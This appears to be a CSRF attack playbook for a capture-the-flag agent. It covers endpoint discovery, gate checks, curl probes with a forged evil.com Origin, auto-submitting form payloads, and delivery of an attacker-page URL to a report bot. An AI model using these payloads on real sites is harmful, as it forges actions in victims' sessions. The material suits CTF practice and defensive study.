# Workflow — CSRF end to end

The loop: inventory the state-changing endpoint, measure its gates
in order, pick the delivery that survives them, fire it through the
viewer, read back the state. Stop conditions: falsifier or budget.

---

## 1. Inventory the state change

```bash
# what changes server-side state? grep the routes
grep -rnoE '(POST|PUT|PATCH|DELETE|route|@app|router|app\.)[^"]*(change|update|transfer|delete|create|set|write|add|remove|edit|modify|assign|register|login|logout|password|email|role|admin|grant)' \
  <src> | head -40

# the front-end's own calls
grep -rnoE 'fetch\(|XMLHttpRequest|axios\.|\.post\(|\.put\(|\.delete\(|\.patch\(' \
  <src> --include='*.js' | head -40
```

The endpoint must DO something — a write, a transfer, a role change,
a credential plant. A read-only GET isn't CSRF material unless it
has a side-effect.

## 2. Classify the write

| Write shape | The CSRF surface |
|---|---|
| form-field POST | a cross-origin form ships it |
| JSON POST | needs text/plain or a lenient parse |
| GET-with-side-effect | a top-nav ships it (Lax-safe) |
| multipart upload | a multipart form ships it |
| login/credential | a credential-plant form |
| role/admin grant | a privileged write via the bot's session |

## 3. Measure the gates in order

```
Gate 1 — authentication: does the endpoint need a session?
Gate 2 — SameSite: will the cookie attach cross-site?
Gate 3 — token: is a CSRF token required and verified?
Gate 4 — Origin/Referer: is a header checked?
Gate 5 — content-type: can a cross-origin form produce it?
Gate 6 — the write itself: does it do something useful?
```

Each gate is a falsifier — pass all six or name the one that holds.

## 4. The probe sequence

```bash
# 1. baseline — your own session, same-origin
curl -i -b "$COOKIE_JAR" -X POST "$BASE/x" -d 'a=1'
#    → status, the write's own answer

# 2. token strip — does it need the token?
curl -i -b "$COOKIE_JAR" -X POST "$BASE/x" -d 'a=1'   # no csrf field
python3 tools/web/csrf_probe.py --url "$BASE/x" --method POST \
  --body 'a=1&csrf=T' --token-field csrf

# 3. foreign Origin — is the header read?
curl -i -b "$COOKIE_JAR" -X POST "$BASE/x" -d 'a=1' \
  -H 'Origin: https://evil.com'

# 4. the cookie attribute — does it attach?
curl -i -b "$COOKIE_JAR" "$BASE/" | grep -i 'set-cookie'

# 5. the content-type — can a form produce it?
curl -i -X POST "$BASE/x" -H 'Content-Type: text/plain' \
  --data '{"a":1,"i":"="}' -b "$COOKIE_JAR"
```

## 5. The decision tree

```text
needs a token the attacker can't read?       → falsifier — dead
SameSite=Strict on the only credential?      → dead for this cookie
SameSite=Lax and the write is POST-only?     → dead via form; try
                                               a GET-reachable write
SameSite=Lax and a GET write exists?         → top-nav form GET
Origin/Referer enforced exactly + required?  → dead unless a bypass
content-type only application/json + strict? → dead via form; try
                                               a lenient-parse or a
                                               urlencoded sibling
everything passes?                           → build the delivery
```

## 6. Build the delivery

```html
<!-- pick the surviving carrier -->
<!-- urlencoded write -->
<form id="f" action="https://target/x" method="POST">
  <input name="a" value="1">
</form>
<script>document.getElementById('f').submit()</script>

<!-- JSON write — text/plain -->
<form id="f" action="https://target/x" method="POST" enctype="text/plain">
  <input name='{"a":"' value='1","i":"'}'>
</form>
<script>document.getElementById('f').submit()</script>

<!-- GET write under Lax — top-level nav -->
<form id="f" action="https://target/x" method="GET">
  <input name="a" value="1">
</form>
<script>document.getElementById('f').submit()</script>
```

## 7. Deliver through the viewer

```bash
# the bot endpoint
curl -X POST "$BASE/report" -d '{"url":"https://attacker/page"}'
curl -X POST "$BASE/report" -H 'Content-Type: application/json' \
  -d '{"url":"data:text/html,<encoded page>"}'   # if bot is airgapped
```

One URL per cycle — the page self-contains the write.

## 8. Read back the state

```bash
# the oracle — the state the write changed
curl -s -b "$COOKIE_JAR" "$BASE/api/me" | grep -o 'csrf-marker'
curl -s "$BASE/stats" | grep -o 'csrf-marker'
# poll until the bot cycle lands
for i in $(seq 1 30); do
  curl -s "$BASE/api/x" | grep -o 'marker' && break; sleep 2; done
```

## 9. Record the verdict

```bash
python3 tools/hooks.py post-probe <c> --verdict confirms \
  --hypothesis-id <H> --class web-csrf --evidence-kind impact \
  --evidence 'the write landed: marker present on my object' \
  --response '<the response bytes the evidence was read from>'
```

The `confirms` needs the attributable state change quoted from a
live response — not "the request returned 200".

## 10. The negative path — each gate that held

```text
each refused delivery names the gate that held:
- 403 on token-strip        → token required — falsifier
- 403 on foreign Origin     → header enforced — dead via this vector
- 415 on text/plain         → content-type whitelisted — dead via form
- no state change after N   → inconclusive — change the carrier
- write lands but is inert  → the write does nothing useful — a
                              different write or a different class
```

## 11. Escalation

```text
per-mechanism budget: 5 probes or 15 min per gate-family
whole-challenge: 25 probes / 45 min
on spend → decide.py escalate: chain_match → reclassify →
           writeup_search → novel_plan → fanout_sweep → solver_handoff
the CSRF that fails on every gate is FALSIFIED — record and pivot
to the class that bypasses the gate (XSS, CORS-open, a stored-
content page, a different write's endpoint)
```

## 12. The ledger

```bash
python3 tools/state.py <c> --hypothesis \
  "csrf-workflow: urlencoded form -> marker-write oracle"
python3 tools/state.py <c> --strategy-used chain_match
```
